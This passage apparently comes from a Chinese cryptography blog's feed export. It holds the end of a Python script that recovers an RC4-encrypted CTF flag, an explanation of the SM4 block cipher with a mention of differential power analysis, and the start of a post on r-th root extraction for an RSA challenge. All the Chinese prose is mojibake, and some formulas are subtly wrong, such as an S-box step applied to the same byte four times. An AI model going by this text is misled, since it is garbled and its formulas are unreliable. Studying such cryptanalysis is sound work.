<span class="number">228</span>, <span class="number">38</span>, <span class="number">48</span>, <span class="number">186</span>, <span class="number">139</span>, <span class="number">201</span>, <span class="number">24</span>, <span class="number">30</span>, <span class="number">134</span>, <span class="number">162</span>, <span class="number">86</span>, <span class="number">187</span>, <span class="number">176</span>, <span class="number">121</span>, <span class="number">206</span>, <span class="number">153</span>, <span class="number">111</span>, <span class="number">161</span>, <span class="number">163</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">188</span>, <span class="number">96</span>, <span class="number">3</span>, <span class="number">52</span>, <span class="number">207</span>, <span class="number">57</span>, <span class="number">8</span>, <span class="number">145</span>, <span class="number">154</span>, <span class="number">238</span>, <span class="number">221</span>, <span class="number">85</span>, <span class="number">204</span>, <span class="number">66</span>, <span class="number">141</span>, <span class="number">143</span>, <span class="number">237</span>, <span class="number">113</span>, <span class="number">53</span>, <span class="number">218</span>, <span class="number">29</span>, <span class="number">177</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">94</span>, <span class="number">183</span>, <span class="number">130</span>, <span class="number">200</span>, <span class="number">12</span>, <span class="number">182</span>, <span class="number">166</span>, <span class="number">205</span>, <span class="number">93</span>, <span class="number">252</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">76</span>, <span class="number">55</span>, <span class="number">81</span>, <span class="number">208</span>, <span class="number">128</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">156</span>, <span class="number">129</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">105</span>, <span class="number">25</span>, <span class="number">75</span>, <span class="number">31</span>, <span class="number">164</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">209</span>, <span class="number">159</span>, <span class="number">2</span>, <span class="number">194</span>, <span class="number">131</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">19</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">125</span>, <span class="number">108</span>, <span class="number">212</span>, <span class="number">170</span>, <span class="number">171</span>, <span class="number">248</span>, <span class="number">236</span>, <span class="number">126</span>, <span class="number">195</span>, <span class="number">174</span>, <span class="number">65</span>, <span class="number">215</span>, <span class="number">160</span>, <span class="number">91</span>, <span class="number">64</span>, <span class="number">172</span>, <span class="number">167</span>, <span class="number">13</span>, <span class="number">169</span>, <span class="number">68</span>, <span class="number">92</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">142</span>, <span class="number">106</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">67</span>, <span class="number">88</span>, <span class="number">253</span>, <span class="number">202</span>, <span class="number">184</span>, <span class="number">22</span>, <span class="number">249</span>, <span class="number">122</span>, <span class="number">62</span>, <span class="number">107</span>, <span class="number">123</span>, <span class="number">45</span>, <span class="number">148</span>, <span class="number">51</span>, <span class="number">100</span>, <span class="number">245</span>, <span class="number">190</span>, <span class="number">231</span>, <span class="number">220</span>, <span class="number">241</span>, <span class="number">213</span>, <span class="number">50</span>, <span class="number">70</span>, <span class="number">219</span>, <span class="number">39</span>, <span class="number">244</span>, <span class="number">82</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">72</span>, <span class="number">119</span>, <span class="number">40</span>, <span class="number">234</span>, <span class="number">224</span>, <span class="number">80</span>, <span class="number">235</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">198</span>, <span class="number">90</span>, <span class="number">60</span>, <span class="number">98</span>, <span class="number">95</span>, <span class="number">179</span>, <span class="number">54</span>, <span class="number">254</span>, <span class="number">74</span>, <span class="number">226</span>, <span class="number">180</span>, <span class="number">230</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">239</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">240</span>, <span class="number">34</span>, <span class="number">199</span>, <span class="number">35</span>, <span class="number">7</span>, <span class="number">210</span>, <span class="number">149</span>, <span class="number">112</span>, <span class="number">41</span>, <span class="number">101</span>, <span class="number">225</span>, <span class="number">168</span>, <span class="number">33</span>, <span class="number">63</span>, <span class="number">216</span>, <span class="number">79</span>, <span class="number">243</span>, <span class="number">17</span>, <span class="number">138</span>, <span class="number">97</span>, <span class="number">147</span>, <span class="number">11</span>, <span class="number">229</span>, <span class="number">222</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">78</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">155</span>, <span class="number">124</span>, <span class="number">135</span>, <span class="number">193</span>, <span class="number">197</span>, <span class="number">223</span>, <span class="number">5</span>, <span class="number">110</span>, <span class="number">246</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">203</span>, <span class="number">89</span>, <span class="number">117</span>, <span class="number">140</span>, <span class="number">114</span>, <span class="number">136</span>, <span class="number">185</span>, <span class="number">15</span>, <span class="number">46</span>, <span class="number">173</span>, <span class="number">102</span>, <span class="number">73</span>, <span class="number">47</span>, <span class="number">217</span>, <span class="number">43</span>, <span class="number">146</span>, <span class="number">133</span>, <span class="number">127</span>, <span class="number">227</span>]</span><br><span class="line">t=s.index(ord(<span class="string">'&#125;'</span>)^ord(<span class="string">'W'</span>))  <span class="comment">#æ ¹æ®æœ€åä¸€ä½å¯†é’¥ï¼Œç¡®å®št</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">50</span><span class="comment">#å¯†æ–‡é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯åŠ å¯†ç»è¿‡çš„å¾ªç¯çš„è¶Ÿæ•°</span></span><br><span class="line">sj=(t-s[i])%<span class="number">256</span></span><br><span class="line">j=s.index(sj)   <span class="comment">#æ ¹æ®tå’Œs[i]çš„å€¼ï¼Œç¡®å®šjçš„å€¼</span></span><br><span class="line">s[i],s[j]=s[j],s[i]<span class="comment">#è·å–ä¸Šä¸€è½®sç›’</span></span><br><span class="line">j=(j-s[i])%<span class="number">256</span><span class="comment">#æ¢å¤å‰ä¸€ä¸ªjçš„å€¼</span></span><br><span class="line">i=i<span class="number">-1</span><span class="comment">#iä¹Ÿéšç€å€’æ¨è€Œå‡å°‘</span></span><br><span class="line">t=(s[i]+s[j])%<span class="number">256</span><span class="comment">#å€’æ•°ç¬¬äºŒè½®çš„iå€¼ï¼Œjå€¼ï¼ŒSç›’éƒ½ç¡®å®šäº†ï¼Œå°±å¯ä»¥æ¨å‡ºtçš„å€¼ï¼Œä»è€Œè·å¾—å¯†é’¥åˆ°æ•°ç¬¬äºŒä½</span></span><br><span class="line">flag=<span class="string">'&#125;'</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">    flag+=(chr((enc[i<span class="number">-1</span>])^s[t]))<span class="comment">#è§£å¯†å¯†æ–‡</span></span><br><span class="line">    s[i],s[j]=s[j],s[i]<span class="comment">#è·å–ä¸Šä¸€è½®Sç›’.....å¦‚æ­¤å¾ªç¯</span></span><br><span class="line">    j=(j-s[i])%<span class="number">256</span></span><br><span class="line">    i=i<span class="number">-1</span></span><br><span class="line">    t=(s[i]+s[j])%<span class="number">256</span></span><br><span class="line"></span><br><span class="line">flag=flag[::<span class="number">-1</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h1 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h1><p>å‰é¢æŒ‰ä½åŠ å¯†çš„RC4ç”±äºç®—æ³•å¼±ç‚¹å·²ç»è¢«åœç”¨äº†ï¼Œè€Œä½œä¸ºæˆ‘å›½çš„åˆ†ç»„å¯†ç æ ‡å‡† SM4åœ¨ç®—æ³•ä¸Šç›®å‰è¿˜æ²¡æœ‰è¢«ç ´è§£ã€‚ï¼ˆä½†ä»æ—§é¢ä¸´å·®åˆ†åŠŸè€—æ”»å‡»çš„å¨èƒï¼‰</p><h2 id="SM4ç®€ä»‹"><a href="#SM4ç®€ä»‹" class="headerlink" title="SM4ç®€ä»‹"></a>SM4ç®€ä»‹</h2><p>SM4æ˜¯ä¸€ç§åˆ†ç»„å¯†ç ç®—æ³•ï¼Œåˆ†ç»„é•¿åº¦ä¸º128bitï¼Œå¯†é’¥é•¿åº¦ä¹Ÿä¸º128bitã€‚åŠ è§£å¯†ç®—æ³•ç»“æ„ç›¸åŒï¼Œè½®å¯†é’¥çš„ä½¿ç”¨æ¬¡åºåˆ™ç›¸åã€‚åŠ å¯†ç®—æ³•å’Œè§£å¯†ç®—æ³•ä»¥åŠå¯†é’¥æ‹“å±•ç®—æ³•å‡é‡‡ç”¨äº†32è½®çš„éçº¿æ€§è¿­ä»£ç»“æ„ </p><h2 id="SM4åŠ å¯†æµç¨‹"><a href="#SM4åŠ å¯†æµç¨‹" class="headerlink" title="SM4åŠ å¯†æµç¨‹"></a>SM4åŠ å¯†æµç¨‹</h2><p><img src="https://i.loli.net/2020/04/30/T9Nm8teudHM3cKG.png" alt="SM4åŠ å¯†æµç¨‹"></p><p>å…¶ä¸­æ˜æ–‡è¢«åˆ†æˆå››ç»„ï¼Œæ¯ä¸€ç»„32bitå³4å­—èŠ‚ã€‚ç„¶ååŠ ä¸Šè½®å¯†é’¥è¿›è¡Œä¸€æ¬¡è½®å‡½æ•°Fè¿ç®—ï¼Œ</p><p>$X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rK_i)=X_i âŠ• T( X_{i+1}âŠ•X_{i+2}âŠ•X_{i+3}âŠ•rK_i)$</p><h3 id="è½®å‡½æ•°Fï¼š"><a href="#è½®å‡½æ•°Fï¼š" class="headerlink" title="è½®å‡½æ•°Fï¼š"></a>è½®å‡½æ•°Fï¼š</h3><h4 id="å…¶ä¸­Tå‡½æ•°ï¼š"><a href="#å…¶ä¸­Tå‡½æ•°ï¼š" class="headerlink" title="å…¶ä¸­Tå‡½æ•°ï¼š"></a>å…¶ä¸­Tå‡½æ•°ï¼š</h4><p>T(x)=L(Ï„(x))</p><h4 id="å…¶ä¸­Ï„æ˜¯éçº¿æ€§å˜æ¢ï¼š"><a href="#å…¶ä¸­Ï„æ˜¯éçº¿æ€§å˜æ¢ï¼š" class="headerlink" title="å…¶ä¸­Ï„æ˜¯éçº¿æ€§å˜æ¢ï¼š"></a>å…¶ä¸­Ï„æ˜¯éçº¿æ€§å˜æ¢ï¼š</h4><p>â€‹        Ï„ç”±å››ä¸ªå¹¶è¡Œçš„Sç›’æ„æˆã€‚</p><p>â€‹        è®¾è¾“å…¥ä¸ºAï¼Œè¾“å‡ºä¸º B(4å­—èŠ‚)</p><p>â€‹        $B =ï¼ˆb_0,b_1,b_2,b_3ï¼‰= Ï„(A)=(Sbox(a_0),Sbox(a_0),Sbox(a_0),Sbox(a_0))$</p><p><img src="https://i.loli.net/2020/04/30/MbhwxpYAZfjrVWu.png" alt="Sbox"></p><h4 id="å…¶ä¸­Lå‡½æ•°ï¼š"><a href="#å…¶ä¸­Lå‡½æ•°ï¼š" class="headerlink" title="å…¶ä¸­Lå‡½æ•°ï¼š"></a>å…¶ä¸­Lå‡½æ•°ï¼š</h4><p>â€‹        è¾“å…¥ä¸ºéçº¿æ€§å˜æ¢çš„è¾“å‡ºï¼Œè®¾è¾“å‡ºä¸ºC</p><p>â€‹        $C = L(B) = B âŠ•ï¼ˆB&lt;&lt;&lt;2ï¼‰ âŠ•(B&lt;&lt;&lt;10) âŠ•(B&lt;&lt;&lt;18) âŠ•(B&lt;&lt;&lt;24)        $ï¼ˆéœ€è¦è¯´æ˜çš„æ˜¯è¿™é‡Œè¿›è¡Œçš„æ˜¯å¾ªç¯ä½ç§»æ“ä½œï¼‰</p><h3 id="å¯†é’¥æ‹“å±•ï¼š"><a href="#å¯†é’¥æ‹“å±•ï¼š" class="headerlink" title="å¯†é’¥æ‹“å±•ï¼š"></a>å¯†é’¥æ‹“å±•ï¼š</h3><h4 id="ç³»ç»Ÿå‚æ•°FK"><a href="#ç³»ç»Ÿå‚æ•°FK" class="headerlink" title="ç³»ç»Ÿå‚æ•°FK"></a>ç³»ç»Ÿå‚æ•°FK</h4><p>è®¾ç³»ç»Ÿå‚æ•°$FK  =  ï¼ˆFK_0,FK_1,FK_2,FK_3ï¼‰$</p><p><img src="https://i.loli.net/2020/04/30/21TFBa8mN4XfSwJ.png" alt="FK"></p><h4 id="å›ºå®šå‚æ•°CK"><a href="#å›ºå®šå‚æ•°CK" class="headerlink" title="å›ºå®šå‚æ•°CK"></a>å›ºå®šå‚æ•°CK</h4><p>è®¾å›ºå®šå‚æ•°$CK = ï¼ˆCK_0,CK_1,CK_2,CK_3ï¼‰$</p><p><img src="https://i.loli.net/2020/04/30/Ws5IuCyFMrifEjx.png" alt="CK"></p><h4 id="åŠ å¯†å¯†é’¥MK"><a href="#åŠ å¯†å¯†é’¥MK" class="headerlink" title="åŠ å¯†å¯†é’¥MK"></a>åŠ å¯†å¯†é’¥MK</h4><p>è®¾åŠ å¯†å¯†é’¥$MK=ï¼ˆMK_0,MK_1,MK_2,MK_3ï¼‰$ï¼ˆå†…å®¹éšä¾¿å®šä¹‰ï¼‰ï¼ˆ$MK_i$ä¸ºå››å­—èŠ‚ï¼Œæ‰€ä»¥å¯†é’¥ä¸º128bitï¼‰</p><h4 id="è½®å¯†é’¥rKi"><a href="#è½®å¯†é’¥rKi" class="headerlink" title="è½®å¯†é’¥rKi"></a>è½®å¯†é’¥rK<del>i</del></h4><p>é¦–å…ˆ$ï¼ˆK_0,K_1,K_2,K_3ï¼‰= ï¼ˆMK_0âŠ•FK_0, MK_1âŠ•, FK_1, MK_2âŠ•FK_2, MK_3âŠ•FK_3ï¼‰$</p><p>ç„¶åç”Ÿæˆè½®å¯†é’¥$rK_i=K_{i+4}=K_iâŠ•Tâ€™(K_{i+1}âŠ•K_{i+2}âŠ•K_{i+3}âŠ•CK_i)    (i=0,1,2,,,31)$</p><p>å…¶ä¸­Tâ€™ä¸ä¸Šæ–‡æåˆ°çš„Tå‡½æ•°å‡ ä¹ä¸€è‡´ï¼Œåªæ˜¯å°†å…¶ä¸­çš„Lå‡½æ•°æ”¹ä¸ºï¼š</p><p>$L`(B) = B âŠ•(B&lt;&lt;&lt;13)âŠ•(B&lt;&lt;&lt;23) $</p><p>å¯ä»¥çœ‹å‡ºåŠ å¯†æ˜¯ä¸€ç»„128bitï¼Œ16å­—èŠ‚ï¼Œä½†ä¸€è½®åªåŠ å¯†4å­—èŠ‚ï¼Œä¸€å…±è¿›è¡Œ32è½®åŠ å¯†ï¼Œæœ€åå°†ç»“æœé€†åºå¾—åˆ°å¯†æ–‡ã€‚</p><h2 id="SM4è§£å¯†æµç¨‹"><a href="#SM4è§£å¯†æµç¨‹" class="headerlink" title="SM4è§£å¯†æµç¨‹"></a>SM4è§£å¯†æµç¨‹</h2><p>ç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼š</p><p>å› ä¸º$X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3~}rK_i)=X_i âŠ• T( X_{i+1}âŠ•X_{i+2}âŠ•X_{i+3}âŠ•rK_i)$</p><p>æ‰€ä»¥$X_i=F(X_{i+4},X_{i+1},X_{i+2},X_{i+3},rK_i)=X_{i+4} âŠ• T(X_{i+1}âŠ•X_{i+2}âŠ•X_{i+3}âŠ•rK_i)$</p><p>æ‰€ä»¥è§£å¯†æµç¨‹ä»…æ˜¯æ˜¯åŠ å¯†æµç¨‹çš„é€†åºï¼š</p><p>å…ˆå°†å¯†æ–‡é€†åºï¼Œç„¶åè½®å¯†é’¥ä¹Ÿè¦å€’ç€ç”¨$rK_31,rK_30,,,,rK_0$</p><p>åªä¸è¿‡åŠ å¯†æ—¶ï¼Œè½®å¯†é’¥çš„ç”Ÿæˆå’Œå¯†æ–‡çš„åŠ å¯†å¯ä»¥åŒæ­¥è¿›è¡Œï¼Œè€Œè§£å¯†æ—¶å°±è¦ä¸€æ¬¡æ€§å…ˆç”Ÿæˆå¥½æ‰€æœ‰çš„è½®å¯†é’¥ï¼Œç„¶åå€’ç€ç”¨ã€‚</p><h1 id="å·®åˆ†åŠŸè€—åˆ†ææ”»å‡»ï¼ˆDPAï¼‰"><a href="#å·®åˆ†åŠŸè€—åˆ†ææ”»å‡»ï¼ˆDPAï¼‰" class="headerlink" title="å·®åˆ†åŠŸè€—åˆ†ææ”»å‡»ï¼ˆDPAï¼‰"></a>å·®åˆ†åŠŸè€—åˆ†ææ”»å‡»ï¼ˆDPAï¼‰</h1><p>â€‹        ç°åœ¨çš„åˆ†ç»„å¯†ç ï¼ŒåŒ…æ‹¬SM4ï¼ŒAESç­‰ç®—æ³•ï¼Œéƒ½é¢ä¸´ç€å·®åˆ†åŠŸè€—æ”»å‡»çš„å¨èƒã€‚ é€šè¿‡åˆ©ç”¨è‡ªä¸»è®¾è®¡çš„åŠŸè€—æ”»å‡»å¹³å°é‡‡é›†SM4ç®—æ³•åŠ å¯†è¿‡ç¨‹ä¸­çš„åŠŸè€—æ›²çº¿ï¼Œå¹¶å¯¹é‡‡é›†å¥½çš„æ›²çº¿è¿›è¡Œå·®åˆ†å¤„ç†ï¼Œä»è€Œè·å¾—äº†SM4ç®—æ³•çš„å¯†é’¥ã€‚å®éªŒç»“æœè¡¨æ˜ï¼Œå½“é‡‡é›†400æ¡ä»¥ä¸ŠåŠŸè€—æ›²çº¿æ—¶ï¼Œå³æœ‰90%ä»¥ä¸Šçš„æ¦‚ç‡ç ´è§£å¯†é’¥ã€‚ </p><p>â€‹        å°½ç®¡ç®—æ³•æœ¬èº«æ²¡æœ‰å¼±ç‚¹ï¼Œä½†æ˜¯åŒ…æ‹¬å·®åˆ†åŠŸè€—æ”»å‡»åœ¨å†…çš„ä¾§ä¿¡é“æ”»å‡»å´æ˜¯ä¸ªå·¨å¤§å¨èƒ</p><p><a href="http://www.fx361.com/page/2018/0506/3480892.shtml" target="_blank" rel="noopener">æ–‡ç« </a>æåˆ°çš„å¯¹SM4çš„å·®åˆ†åŠŸè€—æ”»å‡»å¯ä»¥åˆ†åˆ«çŒœæµ‹è½®å¯†é’¥ï¼Œè¿›è€Œæ¢å¤å¯†é’¥ï¼Œ éªŒè¯äº†SM4ç®—æ³•åœ¨é¢ä¸´å·®åˆ†åŠŸè€—æ”»å‡»æ—¶çš„è„†å¼±æ€§ã€‚ä¹Ÿä¸ºSMç®—æ³•çš„è¿›ä¸€æ­¥æ”¹å–„å’Œå®Œå–„æä¾›äº†ä¾æ®ã€‚èƒ½å¤Ÿæœ‰æ•ˆæŠµå¾¡å·®åˆ†åŠŸè€—æ”»å‡»åº”è¯¥æœªæ¥å®‰å…¨åŠ å¯†ç®—æ³•éœ€è¦è€ƒè™‘çš„ä¸€ä¸ªé‡è¦å› ç´ ã€‚</p><h1 id="å‚è€ƒèµ„æ–™ï¼š"><a href="#å‚è€ƒèµ„æ–™ï¼š" class="headerlink" title="å‚è€ƒèµ„æ–™ï¼š"></a>å‚è€ƒèµ„æ–™ï¼š</h1><p> <a href="https://baike.baidu.com/item/RC4/3454548?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/RC4/3454548?fr=aladdin</a> </p><p> <a href="https://zh.wikipedia.org/wiki/RC4" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/RC4</a> </p><p> <a href="https://baike.baidu.com/item/SM4.0/3901780?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/SM4.0/3901780?fr=aladdin</a> </p><p> <a href="https://blog.csdn.net/weixin_37569048/article/details/94983841" target="_blank" rel="noopener">https://blog.csdn.net/weixin_37569048/article/details/94983841</a> </p><p> <a href="https://blog.csdn.net/cg129054036/article/details/83016958" target="_blank" rel="noopener">https://blog.csdn.net/cg129054036/article/details/83016958</a> </p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Stream </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rc4 </tag>
            
            <tag> SM4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ æµ…æOn r-th Root Extraction Algorithm in Fq</title>
      <link href="/2019/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90On%20r-th%20Root%20Extraction%20Algorithm%20in%20Fq/"/>
      <url>/2019/12/04/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90On%20r-th%20Root%20Extraction%20Algorithm%20in%20Fq/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/194232" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>åœ¨NCTFä¸Šé‡åˆ°äº†ä¸€é“å‡ºé¢˜äººç”¨æ¥å‹è½´çš„RSAï¼Œä¸æ­£å¸¸RSAåŠ å¯†ä¸åŒçš„æ˜¯ï¼Œæœ¬é¢˜çš„$e$æ˜¯$Ï†(p)$å’Œ$Ï†(q)$çš„ä¸€ä¸ªå› å­ã€‚åœ¨å‡ºé¢˜äººç»™å‡ºhintåï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ç¯‡paperï¼Œä¾¥å¹¸ç”¨paperä¸­æåˆ°çš„ç®—æ³•æ‹¿åˆ°äº†ä¸€è¡€~</p><p>è¯¥ç®—æ³•å¯ä»¥åœ¨æœ‰é™åŸŸ$F_q$ä¸­å¼€$r$æ¬¡æ ¹ï¼Œä½†éœ€è¦sï¼Œæ»¡è¶³$r^s$æ•´é™¤$q-1$ï¼Œå³$r^s$ | $q-1$ï¼Œå¹¶ä¸”$s$è¦å°ã€‚</p><h2 id="On-r-th-Root-Extraction-Algorithm-in-Fq"><a href="#On-r-th-Root-Extraction-Algorithm-in-Fq" class="headerlink" title="On r-th Root Extraction Algorithm in Fq"></a>On r-th Root Extraction Algorithm in Fq</h2><p><a href="https://eprint.iacr.org/2013/117.pdf" target="_blank" rel="noopener">On r-th Root Extraction Algorithm </a></p><h3 id="å¼•è¨€ï¼š"><a href="#å¼•è¨€ï¼š" class="headerlink" title="å¼•è¨€ï¼š"></a>å¼•è¨€ï¼š</h3><p>æˆ‘ä»¬è®©rä¸ºä¸€ä¸ªå¤§äº1çš„æ•´æ•°ï¼Œé‚£ä¹ˆæœ‰ç°å­˜çš„ä¸¤ç§ç®—æ³•ç”¨æ¥åœ¨æœ‰é™åŸŸFqä¸­å¼€r^sæ¬¡æ ¹ï¼Œ the Adleman-Manders-Miller algorithm å’Œ the Cipolla-Lehmer algorithms</p><p>å‡è®¾$r&lt;&lt;log q$ ï¼Œç”±äº the Adleman-Manders-Miller algorithm è¦æ±‚sæ»¡è¶³$ r^s | q-1 $å¹¶ä¸” $r^{s+1}$ ä¸èƒ½æ•´é™¤ $q-1$ï¼Œæ‰€ä»¥å®ƒçš„æ—¶é—´å¤æ‚åº¦O(logrlog4 q) æ¯” the Cipolla-Lehmer algorithms çš„æ—¶é—´å¤æ‚åº¦$O(rlog_3q)$ è¦é«˜ã€‚ä½†æ˜¯ï¼Œç”±äºCipolla Lehmeréœ€è¦ç¹ççš„æ‰©å±•å­—æ®µç®—æ³•ï¼Œå½“sæ¯”è¾ƒå°æ—¶ï¼Œthe Adleman-Manders-Miller algorithm è¦æ¯”ä¹‹æ›´ä¸ºæœ‰æ•ˆã€‚</p><p>å¦ä¸€æ–¹é¢ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿˜å­˜åœ¨æ¯” Tonelli-Shanks è®¡ç®—æ›´å¿«çš„å…¶ä»–æ–¹æ³•æ¥åšå¼€æ–¹è¿ç®—ã€‚ä¾‹å­å°±æ˜¯å½“ $q\equiv  3 \pmod {4}$.</p><p>$c$æ—¶$F_q$ä¸­çš„äºŒæ¬¡å‰©ä½™æ—¶ï¼Œ$c$çš„å…¶ä¸­ä¸€ä¸ªæ ¹å°±æ˜¯$c^\frac{q+1}{4}$ï¼Œåˆ©ç”¨æ¬§æ‹“å¾ˆå®¹æ˜“è¯æ˜$(c^\frac{q+1}{4})^2 = c$</p><p>å½“$s=2ï¼Œ3$æ—¶ï¼Œä¹Ÿæœ‰ç±»ä¼¼çš„æ–¹æ³•ï¼Œ Atkin , MuÂ¨ller and Kong et al ï¼Œä»–ä»¬çš„æ–¹æ³•åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ è¦æ¯”Tonelli-Shanks and the Cipolla-Lehmer è¡¨ç°å¾—æ›´ä¸ºå‡ºè‰²ã€‚</p><p><img src="https://i.loli.net/2020/04/30/AerdW8NUFjV4iao.png" alt="Tonelli-Shanks and the Cipolla-Lehmer "></p><p>ä½†æ˜¯ä½œè€…è®¤ä¸ºè¿™äº›æ–¹æ³•ä¸èƒ½å¾ˆå¥½çš„è§£å†³æ™®éçš„æƒ…å†µï¼Œæ‰€ä»¥ä½œè€…å±•ç¤ºäº†ä¸€ç§ï¼Œæ–°çš„å¼€æ ¹çš„æ–¹æ³•ï¼Œåªç”¨ä¸€ä¸ªé¢„è®¡ç®—å¥½çš„åŸºå…ƒï¼Œä¸€æ¬¡æŒ‡æ•°è¿ç®—ï¼Œå¹¶ä¸”åœ¨så¾ˆå°çš„æ—¶å€™ååˆ†é«˜æ•ˆã€‚</p><h3 id="å¼€äºŒæ¬¡æ ¹ç®—æ³•ï¼š"><a href="#å¼€äºŒæ¬¡æ ¹ç®—æ³•ï¼š" class="headerlink" title="å¼€äºŒæ¬¡æ ¹ç®—æ³•ï¼š"></a>å¼€äºŒæ¬¡æ ¹ç®—æ³•ï¼š</h3><p>æœ‰ä¸€äº›é«˜æ•ˆçš„å…¬å¼ï¼Œåˆ†åˆ«å½“$ q \equiv  5 \pmod{ 8}$ ï¼Œæˆ–è€… $q \equiv  9 \pmod{ 16}$ ã€‚å¦‚æœ$q \equiv  5 \pmod{ 8}$ï¼Œå±äº $q \equiv  1 \pmod{ 4}$, çš„ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œ Atkin æœ‰ä¸€ç§åªè¿›è¡Œä¸€æ¬¡æŒ‡æ•°è¿ç®—çš„é«˜æ•ˆçš„å…¬å¼ã€‚</p><h5 id="Algorithm-1-Atkinâ€™s-algorithm-when-q-equiv-5-pmod-8"><a href="#Algorithm-1-Atkinâ€™s-algorithm-when-q-equiv-5-pmod-8" class="headerlink" title="Algorithm 1 Atkinâ€™s algorithm when $q \equiv  5 \pmod{ 8}$"></a>Algorithm 1 Atkinâ€™s algorithm when $q \equiv  5 \pmod{ 8}$</h5><p>æ–¹ç¨‹ï¼Œ$x^2 = a \pmod{q}$ï¼Œå·²çŸ¥aï¼Œæ±‚x</p><ol><li>$b &lt;== (2a)^\frac{q-5}{8}$</li><li>$i &lt;== 2ab^2$</li><li>$x &lt;==ab(i-1)$</li><li>$return x$</li></ol><h5 id="Algorithm-2-MuÂ¨llerâ€™s-algorithm-when-q-equiv-9-pmod-16"><a href="#Algorithm-2-MuÂ¨llerâ€™s-algorithm-when-q-equiv-9-pmod-16" class="headerlink" title="Algorithm 2 MuÂ¨llerâ€™s algorithm when $q \equiv  9 \pmod{ 16}$"></a>Algorithm 2 MuÂ¨llerâ€™s algorithm when $q \equiv  9 \pmod{ 16}$</h5><p>æ–¹ç¨‹ï¼Œ$x^2 = a \pmod{q}$ï¼Œå·²çŸ¥$a$ï¼Œæ±‚$x$</p><ol><li>$b &lt;== (2a)^\frac{q-1}{4}$</li><li>$Find randomly d satisfying -b = Î·(d)$</li><li>$u &lt;== (2ad^2)^\frac{q-9}{16}$</li><li>$i &lt;== 2u^2d^2a$</li><li>$x &lt;== uda(i-1)$</li><li>$retrun x$</li></ol><p>å…¶ä¸­ç¬¬äºŒæ­¥æœ‰ä¸ªç¥å¥‡çš„ä¸œè¥¿ $Î·(d)$ ï¼Œpaperä¸­ç»™çš„å®šä¹‰æ˜¯</p><p><img src="https://i.loli.net/2020/04/30/YuCydhUnjMKci4t.png" alt="problem"></p><p>ï¼Œç„¶é¹…æƒ³ä¸å‡ºæ€ä¹ˆè®©å®ƒç­‰äº$-b$ï¼Œï¼ˆè¿˜æ±‚å¤§å¸ˆå‚…ä»¬æŒ‡ç‚¹~ï¼‰</p><h3 id="åœ¨æœ‰é™åŸŸä¸­-Fq-å¼€-r-s-æ ¹-q-equiv-lr-s-1-pmod-r-s-1"><a href="#åœ¨æœ‰é™åŸŸä¸­-Fq-å¼€-r-s-æ ¹-q-equiv-lr-s-1-pmod-r-s-1" class="headerlink" title="åœ¨æœ‰é™åŸŸä¸­ Fq å¼€ $r^s$ æ ¹ [ $q \equiv  lr^s + 1 \pmod{ r^{s+1})}$ ]"></a>åœ¨æœ‰é™åŸŸä¸­ Fq å¼€ $r^s$ æ ¹ [ $q \equiv  lr^s + 1 \pmod{ r^{s+1})}$ ]</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªè´¨æ•°$q$ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª$r$ï¼Œæ»¡è¶³$ r | (q-1)$ï¼Œï¼ˆå¦‚æœ$r$ä¸$q-1$äº’è´¨ï¼Œé‚£é—®é¢˜å°±å¾ˆç®€å•äº†ï¼Œ$r$çš„é€†ç”¨æ¬§æ‹“å¾ˆå¿«å°±èƒ½æ‰¾åˆ°ï¼‰ç„¶åä¼šå­˜åœ¨ä¸€ä¸ªsï¼Œsæ˜¯æ»¡è¶³$\frac{q-1}{r^s} \equiv l \pmod{r}$çš„æœ€å¤§çš„æ­£æ•´æ•°</p><p>å³ä¼šæ»¡è¶³$q \equiv lr^s + 1 \pmod{r^{s+1}}$</p><h4 